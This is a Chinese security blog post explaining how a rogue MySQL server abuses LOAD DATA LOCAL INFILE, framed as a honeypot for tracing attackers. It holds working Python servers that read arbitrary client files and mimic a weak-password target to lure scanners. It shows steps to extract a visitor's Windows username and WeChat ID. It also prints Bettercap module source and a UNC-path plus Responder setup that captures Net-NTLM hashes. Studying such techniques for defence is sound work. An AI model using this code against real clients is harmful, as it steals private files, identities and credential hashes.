> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rQ9BpavBeMnS6xUOidZ5OA)

这是 **酒仙桥六号部队** 的第 **14**2**** 篇文章。

全文共计12732个字，预计阅读时长33分钟。

  

**前言**

前不久，零队发了一篇《MySQL蜜罐获取攻击者微信ID》的文章，文章讲述了如何通过`load data local infile`进行攻击者微信`ID`的抓取，学习的过程中发现虽然问题是一个比较老的问题，但是扩展出来的很多知识都比较有意思，记录一下。

  

**分析过程**

LOAD DATA INFILE
----------------

在`MySQL`中`LOAD DATA INFILE` 语句以非常高的速度从文本文件中读取行到表中，基本语法如下：

```
`load data  [low_priority] [local] infile 'file_name txt' [replace | ignore]``into table tbl_name``[fields``[terminated by't']``[OPTIONALLY] enclosed by '']``[escaped by'\' ]]``[lines terminated by'n']``[ignore number lines]``[(col_name,   )]`
```

这个功能默认是关闭的，当我们没有开启这个功能时执行`LOAD DATA INFILE`报错如下：

```
> 1148 - The used command is not allowed with this MySQL version
```

我们可以通过如下命令查看功能状态。

```
show global variables like 'local_infile';
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们可以通过如下命令开启该功能。

```
set global local_infile=1;
```

开启之后我们就可以通过如下命令进行文件读取并且写入到表中，我们以`C:\1.txt`为例，将其中内容写入到`test`表中，并且以`\n`为分隔符。

```
load data local infile 'C:/1.txt' into table test fields terminated by '\n';
```

这样我们就可以读取客户端本地的文件，并写入到表中。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通信过程
----

接下来我们通过`Wireshark`抓取过程中的流量分析一下通信过程。

首先是`Greeting`包，返回了服务端的`Version`等信息。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

接下来客户端发送登录请求。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

接下来客户端发送了如下请求：

```
SET NAMES utf8mb4SET NAMES utf8mb4
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

接下来我们执行我们的`payload`

```
load data local infile 'C:/1.txt' into table test fields terminated by '\n';
```

首先客户端发起请求；

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

之后服务端会回复一个`Response TABULAR`，其中包含请求文件名的包；

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里数据包我们要注意的地方如下：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

如上图，数据包中内容如下：  

```
09 00 00 01 fb 43 3a 2f 31 2e 74 78 74
```

这里的`09`指的是从`fb`开始十六进制的数据包中文件名的长度，`00 00 01`值得是数据包的序号，`fb`是包的类型，`43 4a 2f 31 2e 74 78 74`指的是文件名，接下来客户端向服务端发送文件内容的数据包。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

任意文件读取过程
--------

在`MySQL`协议中，客户端本身不存储自身的请求，而是通过服务端的响应来执行操作，也就是说我们如果可以伪造`Greeting`包和伪造的文件名对应的数据包，我们就可以让攻击者的客户端给我们把我们想要的文件拿过来，过程大致如下，首先我们将`Greeting`包发送给要连接的客户端，这样如果客户端发送查询之后，我们返回一个`Response TABULAR`数据包，并且附上我们指定的文件，我们也就完成了整个任意文件读取的过程，接下来就是构造两个包的过程，首先是`Greeting`包，这里引用`lightless`师傅博客中的一个样例。

```
`'\x0a',  # Protocol``'6.6.6-lightless_Mysql_Server' + '\0',  # Version``'\x36\x00\x00\x00',  # Thread ID``'ABCDABCD' + '\0',  # Salt``'\xff\xf7',  # Capabilities, CLOSE SSL HERE!``'\x08',  # Collation``'\x02\x00',  # Server Status``"\x0f\x80\x15",` `'\0' * 10,  # Unknown``'ABCDABCD' + '\0',``"mysql_native_password" + "\0"`
```

根据以上样例，我们就可以方便的构造`Greeting`包了，当然，这里我们也可以直接利用上面我们`Wireshark`抓取到的`Greeting`包，接下来就是`Response TABULAR`包了，包的格式上面我们分析过了，我们可以直接构造如下`Paylod`

```
chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
```

我们就可以对客户端的指定文件进行读取了，这里我们还缺少一个条件，`RUSSIANSECURITY`在博客中也提及过如下内容。

For successfully exploitation you need at least one query to server. Fortunately most of mysql clients makes at least one query like ‘*SET names “utf8”* or something.

这是因为我们传输这个文件读取的数据包时，需要等待一个来自客户端的查询请求才能回复这个读文件的请求，也就是我们现在还需要一个来自客户端的查询请求，幸运的是，通过我们上面的分析我们可以看到，形如`Navicat`等客户端进行连接的时候，会自动发送如下查询请求。

```
SET NAMES utf8mb4
```

从查阅资料来看，大多数MySQL客户端以及程序库都会在握手之后至少发送一次请求，以探测目标平台的指纹信息，例如：

```
select @@version_comment limit 1
```

这样我们的利用条件也就满足了，综上，我们可以恶意模拟一个`MySQL`服务端的身份认证过程，之后等待客户端发起一个`SQL`查询，之后响应的时候我们将我们构造的`Response TABULAR`发送给客户端，也就是我们`LOAD DATA INFILE`的请求，这样客户端根据响应内容执行上传本机文件的操作，我们也就获得了攻击者的文件信息，整体流程图示如下：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们可以用`Python`来简单模拟一下这个过程:

```
`import socket``serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)` `port = 3306``serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)``serversocket.bind(("", port))``serversocket.listen(5)``while True:` `# 建立客户端连接` `clientsocket,addr = serversocket.accept()`  `print("连接地址: %s" % str(addr))` `# 返回版本信息` `version_text = b"\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x00\x2a\x51\x47\x38\x48\x17\x12\x21\x00\xff\xff\xc0\x02\x00\xff\xc3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x6f\x6e\x25\x61\x3e\x48\x31\x25\x43\x2b\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"` `clientsocket.sendall(version_text)` `try:` `# 客户端请求信息` `clientsocket.recv(9999)` `except Exception as e:` `print(e)` `# Response OK` `verification = b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"` `clientsocket.sendall(verification)` `try:` `# SET NAMES utf8mb4` `clientsocket.recv(9999)` `except Exception as e:` `print(e)` `# Response TABULAR` `evil_response = b"\x09\x00\x00\x01\xfb\x43\x3a\x2f\x31\x2e\x74\x78\x74"` `clientsocket.sendall(evil_response)` `# file_text` `print(clientsocket.recv(9999))` `clientsocket.close()`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们可以看到，当攻击者链接我们构造的蜜罐时，我们成功抓取到了攻击者`C:/1.txt`文件中的内容，接下来就是对任意文件的构造，我们上面也分析了`Response TABULAR`数据包的格式，因此我们只需要对我们的文件名进行构造即可，这里不再赘述。

```
chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
```

欺骗扫描器
-----

接下来一个主要问题就是让攻击者的扫描器发现我们是弱口令才行，这样他才有可能连接，所以还需要分析一下扫描器的通信过程，这里以`SNETCracker`为例。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

首先还是分析通信过程，首先还是`Greeting`包，返回版本信息等。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

之后客户端向服务端发送请求登录的数据包。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

接下来服务端向客户端返回验证成功的数据包。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

从上面流程上来说，其实检查口令的部分已经结束了，但是这个软件本身还进行了下面的进一步判断，当下面判断条件也成立时，才会认为成功爆破了`MySQL`，接下来查看系统变量以及相应的值。

```
SHOW VARIABLES
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

服务端返回响应包后，继续查看警告信息。

```
SHOW WARNINGS
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

服务端返回响应包后，继续查看所有排列字符集。

```
SHOW COLLATION
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

到这里，如果我们伪造的蜜罐都可以返回相应的响应包，这时候`SNETCracker`就可以判断弱口令存在，并正常识别了，我们使用`Python`模拟一下整个过程。

```
`import socket``serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)` `port = 3306``serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)``serversocket.bind(("", port))``serversocket.listen(5)``# 建立客户端连接``clientsocket,addr = serversocket.accept()` `print("连接地址: %s" % str(addr))``# 返回版本信息``version_text = b"\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x00\x34\x58\x29\x37\x38\x2f\x6d\x20\x00\xff\xff\xc0\x02\x00\xff\xc3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x1f\x07\x48\x54\x56\x3f\x1e\x15\x2a\x58\x59\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"``clientsocket.sendall(version_text)``print(clientsocket.recv(9999))``verification = b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"``clientsocket.sendall(verification)``print(clientsocket.recv(9999))``show_variables = b'太长了，已经省略'``clientsocket.sendall(show_variables)``print(clientsocket.recv(9999))``show_warnings = b"\x01\x00\x00\x01\x03\x1b\x00\x00\x02\x03\x64\x65\x66\x00\x00\x00\x05\x4c\x65\x76\x65\x6c\x00\x0c\x08\x00\x07\x00\x00\x00\xfd\x01\x00\x1f\x00\x00\x1a\x00\x00\x03\x03\x64\x65\x66\x00\x00\x00\x04\x43\x6f\x64\x65\x00\x0c\x3f\x00\x04\x00\x00\x00\x03\xa1\x00\x00\x00\x00\x1d\x00\x00\x04\x03\x64\x65\x66\x00\x00\x00\x07\x4d\x65\x73\x73\x61\x67\x65\x00\x0c\x08\x00\x00\x02\x00\x00\xfd\x01\x00\x1f\x00\x00\x05\x00\x00\x05\xfe\x00\x00\x02\x00\x68\x00\x00\x06\x07\x57\x61\x72\x6e\x69\x6e\x67\x04\x31\x33\x36\x36\x5a\x49\x6e\x63\x6f\x72\x72\x65\x63\x74\x20\x73\x74\x72\x69\x6e\x67\x20\x76\x61\x6c\x75\x65\x3a\x20\x27\x5c\x78\x44\x36\x5c\x78\x44\x30\x5c\x78\x42\x39\x5c\x78\x46\x41\x5c\x78\x42\x31\x5c\x78\x45\x41\x2e\x2e\x2e\x27\x20\x66\x6f\x72\x20\x63\x6f\x6c\x75\x6d\x6e\x20\x27\x56\x41\x52\x49\x41\x42\x4c\x45\x5f\x56\x41\x4c\x55\x45\x27\x20\x61\x74\x20\x72\x6f\x77\x20\x31\x05\x00\x00\x07\xfe\x00\x00\x02\x00"``clientsocket.sendall(show_warnings)``print(clientsocket.recv(9999))``show_collation = b'太长了，已经省略'``clientsocket.sendall(show_collation)``print(clientsocket.recv(9999))`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

至此我们欺骗扫描器的过程已经结束，攻击者已经可以“快速”的扫描到我们的蜜罐了，只要他进行连接，我们就可以按照上面的方法来读取他电脑上的文件了。

获取微信
----

如果我们想进行溯源，就需要获取一些能证明攻击者身份信息的文件，而且这些文件需要位置类型固定，从而我们能方便的进行获取，从而进行进一步的调查反制。

`alexo0`师傅在文章中提到过关于微信的抓取：

> `Windows`下，微信默认的配置文件放在`C:\Users\username\Documents\WeChat Files\`中，在里面翻翻能够发现 `C:\Users\username\Documents\WeChat Files\All Users\config\config.data` 中含有微信`ID`，而获取这个文件还需要一个条件，那就是要知道攻击者的电脑用户名，用户名一般有可能出现在一些日志文件里，我们需要寻找一些比较通用、文件名固定的文件。经过测试，发现一般用过一段时间的电脑在 `C:\Windows\PFRO.log` 中较大几率能找到用户名。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通过以上条件我们就能获得攻击者的`wxid`了，接下来就是如何将`wxid`转换为二维码方便我们扫描，通过资料得知方法如下：

```
weixin://contacts/profile/{wxid}
```

将相应`wxid`填入上述字符串后，再对字符串转换成二维码，之后使用安卓端微信进行扫码即可，可以使用如下函数进行二维码生成：

```
`import qrcode``from PIL import Image``import os``# 生成二维码图片``# 参数为wxid和二维码要保存的文件名``def make_qr(str,save):` `qr=qrcode.QRCode(` `version=4,  #生成二维码尺寸的大小 1-40  1:21*21（21+(n-1)*4）` `error_correction=qrcode.constants.ERROR_CORRECT_M, #L:7% M:15% Q:25% H:30%` `box_size=10, #每个格子的像素大小` `border=2, #边框的格子宽度大小` `)` `qr.add_data(str)` `qr.make(fit=True)` `img=qr.make_image()` `img.save(save)``# 读取到的wxid``wxid = ''``qr_id = 'weixin://contacts/profile/' + wxid``make_qr(qr_id,'demo.jpg')`
```

这样，我们组合上面的过程，就可以通过正则首先获得用户`username`

```
re.findall( r'.*C:\\Users\\(.*?)\\AppData\\Local\\.*', result)
```

之后再将获得的`username`进行拼接，获取到攻击者的微信配置文件：

```
C:\Users\{username}\Documents\WeChat Files\All Users\config\config.data
```

最后再正则获得其中的`wxid`，并且利用上述函数转换为二维码即可，这样当攻击者扫描到我们的`蜜罐`之后，进行连接，我们就可以抓取到攻击者的`wxid`，并生成二维码了。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

至此，我们构建的蜜罐已经将攻击者的微信给我们带回来了。

NTLM HASH
---------

我们知道，`NTLM`认证采用质询/应答的消息交换模式，流程如下：

1.  客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash；
    
2.  服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge1；
    
3.  客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器；
    
4.  服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功。
    

在以上流程中，登录用户的密码`hash`即`NTLM hash`，`response`中包含`Net-NTLM hash`，而对于`SMB`协议来说，客户端连接服务端的时候，会优先使用本机的用户名和密码`hash`来进行登录尝试，而`INFILE`又支持`UNC`路径，组合这两点我们就能通过构造一个恶意的`MySQL`服务器，`Bettercap`本身已经集成了一个恶意`MySQL`服务器，代码如下：

```
`package mysql_server``import (` `"bufio"` `"bytes"` `"fmt"` `"io/ioutil"` `"net"` `"strings"` `"github.com/bettercap/bettercap/packets"` `"github.com/bettercap/bettercap/session"` `"github.com/evilsocket/islazy/tui"``)``type MySQLServer struct {` `session.SessionModule` `address  *net.TCPAddr` `listener *net.TCPListener` `infile   string` `outfile  string``}``func NewMySQLServer(s *session.Session) *MySQLServer {` `mod := &MySQLServer{` `SessionModule: session.NewSessionModule("mysql.server", s),` `}` `mod.AddParam(session.NewStringParameter("mysql.server.infile",` `"/etc/passwd",` `"",` `"File you want to read. UNC paths are also supported."))` `mod.AddParam(session.NewStringParameter("mysql.server.outfile",` `"",` `"",` `"If filled, the INFILE buffer will be saved to this path instead of being logged."))` `mod.AddParam(session.NewStringParameter("mysql.server.address",` `session.ParamIfaceAddress,` `session.IPv4Validator,` `"Address to bind the mysql server to."))` `mod.AddParam(session.NewIntParameter("mysql.server.port",` `"3306",` `"Port to bind the mysql server to."))` `mod.AddHandler(session.NewModuleHandler("mysql.server on", "",` `"Start mysql server.",` `func(args []string) error {` `return mod.Start()` `}))` `mod.AddHandler(session.NewModuleHandler("mysql.server off", "",` `"Stop mysql server.",` `func(args []string) error {` `return mod.Stop()` `}))` `return mod``}``func (mod *MySQLServer) Name() string {` `return "mysql.server"``}``func (mod *MySQLServer) Description() string {` `return "A simple Rogue MySQL server, to be used to exploit LOCAL INFILE and read arbitrary files from the client."``}``func (mod *MySQLServer) Author() string {` `return "Bernardo Rodrigues (https://twitter.com/bernardomr)"``}``func (mod *MySQLServer) Configure() error {` `var err error` `var address string` `var port int` `if mod.Running() {` `return session.ErrAlreadyStarted(mod.Name())` `} else if err, mod.infile = mod.StringParam("mysql.server.infile"); err != nil {` `return err` `} else if err, mod.outfile = mod.StringParam("mysql.server.outfile"); err != nil {` `return err` `} else if err, address = mod.StringParam("mysql.server.address"); err != nil {` `return err` `} else if err, port = mod.IntParam("mysql.server.port"); err != nil {` `return err` `} else if mod.address, err = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", address, port)); err != nil {` `return err` `} else if mod.listener, err = net.ListenTCP("tcp", mod.address); err != nil {` `return err` `}` `return nil``}``func (mod *MySQLServer) Start() error {` `if err := mod.Configure(); err != nil {` `return err` `}` `return mod.SetRunning(true, func() {` `mod.Info("server starting on address %s", mod.address)` `for mod.Running() {` `if conn, err := mod.listener.AcceptTCP(); err != nil {` `mod.Warning("error while accepting tcp connection: %s", err)` `continue` `} else {` `defer conn.Close()` `// TODO: include binary support and files > 16kb` `clientAddress := strings.Split(conn.RemoteAddr().String(), ":")[0]` `readBuffer := make([]byte, 16384)` `reader := bufio.NewReader(conn)` `read := 0` `mod.Info("connection from %s", clientAddress)` `if _, err := conn.Write(packets.MySQLGreeting); err != nil {` `mod.Warning("error while writing server greeting: %s", err)` `continue` `} else if _, err = reader.Read(readBuffer); err != nil {` `mod.Warning("error while reading client message: %s", err)` `continue` `}` `// parse client capabilities and validate connection` `// TODO: parse mysql connections properly and` `//       display additional connection attributes` `capabilities := fmt.Sprintf("%08b", (int(uint32(readBuffer[4]) | uint32(readBuffer[5])<<8)))` `loadData := string(capabilities[8])` `username := string(bytes.Split(readBuffer[36:], []byte{0})[0])` `mod.Info("can use LOAD DATA LOCAL: %s", loadData)` `mod.Info("login request username: %s", tui.Bold(username))` `if _, err := conn.Write(packets.MySQLFirstResponseOK); err != nil {` `mod.Warning("error while writing server first response ok: %s", err)` `continue` `} else if _, err := reader.Read(readBuffer); err != nil {` `mod.Warning("error while reading client message: %s", err)` `continue` `} else if _, err := conn.Write(packets.MySQLGetFile(mod.infile)); err != nil {` `mod.Warning("error while writing server get file request: %s", err)` `continue` `} else if read, err = reader.Read(readBuffer); err != nil {` `mod.Warning("error while readind buffer: %s", err)` `continue` `}` `if strings.HasPrefix(mod.infile, "\\") {` `mod.Info("NTLM from '%s' relayed to %s", clientAddress, mod.infile)` `} else if fileSize := read - 9; fileSize < 4 {` `mod.Warning("unexpected buffer size %d", read)` `} else {` `mod.Info("read file ( %s ) is %d bytes", mod.infile, fileSize)` `fileData := readBuffer[4 : read-4]` `if mod.outfile == "" {` `mod.Info("\n%s", string(fileData))` `} else {` `mod.Info("saving to %s ...", mod.outfile)` `if err := ioutil.WriteFile(mod.outfile, fileData, 0755); err != nil {` `mod.Warning("error while saving the file: %s", err)` `}` `}` `}` `conn.Write(packets.MySQLSecondResponseOK)` `}` `}` `})``}``func (mod *MySQLServer) Stop() error {` `return mod.SetRunning(false, func() {` `defer mod.listener.Close()` `})``}`
```

通过查阅文档，我们可以看到相关参数的设置如下：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们这里将我们的`mysql.server.infile`设置成`UNC`路径。

```
set mysql.server.infile \\192.168.165.128\test; mysql.server on
```

并且通过`responder`进行监听。

```
responder --interface eth0 -i 192.168.231.153
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

当攻击者使用客户端连接我们的`恶意服务器`时，

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们就成功的截获了`NTLM`的相关信息。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**参考连接**

1.  [https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg](https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484614&idx=1&sn=a719aaad15112d4ec26ab3f3c89cadc5&scene=21#wechat_redirect)
    
2.  https://www.bettercap.org/modules/ethernet/servers/mysql.server/
    
3.  https://www.colabug.com/2019/0408/5936906/
    
4.  https://github.com/bettercap/bettercap
    
5.  http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/
    
6.  https://lightless.me/archives/read-mysql-client-file.html
    

  

[![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247488442&idx=2&sn=56bbdbf3f35b3781aabd65c0d4b2f75b&chksm=9b39350bac4ebc1d010cd744eec558c5562883dafe376e13c8c0b8b4f2fbbba0d81639d107d6&scene=21#wechat_redirect)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)